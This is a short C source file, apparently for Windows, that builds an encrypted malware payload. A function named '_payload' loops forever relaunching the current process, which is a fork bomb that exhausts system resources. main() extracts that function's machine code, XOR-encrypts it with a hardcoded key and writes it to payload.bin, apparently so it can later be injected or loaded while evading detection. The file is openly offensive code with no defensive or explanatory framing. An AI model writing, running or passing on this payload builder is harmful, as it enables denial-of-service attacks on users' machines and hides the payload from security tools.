#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "encrypt.h"

void _payload(
    int (*CloseHandle)(HANDLE hObject),
    int (*CreateProcess)(
        LPCWSTR lpApplicationName,
        LPWSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCWSTR lpCurrentDirectory,
        LPSTARTUPINFOW lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ),
    LPWSTR (*GetCommandLine)(void)
) {
    while (1) {
        STARTUPINFO info = { sizeof(info) };
        PROCESS_INFORMATION processInfo;
        if (CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo)) {
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
        }
    }
}

int main(void) {
    FILE *payload = fopen("payload.bin", "wb");;
    size_t nbytes = (size_t)main - (size_t)_payload;
    char buff[nbytes];

    if (payload == NULL) {
        return 1;
    }

    char key[] = "my simple key";
    int lenkey = strlen(key);

    encrypt_xor(buff, (char*)_payload, nbytes, key, lenkey);

    fwrite(buff, sizeof(char), nbytes, payload);
    fclose(payload);

    return 0;
}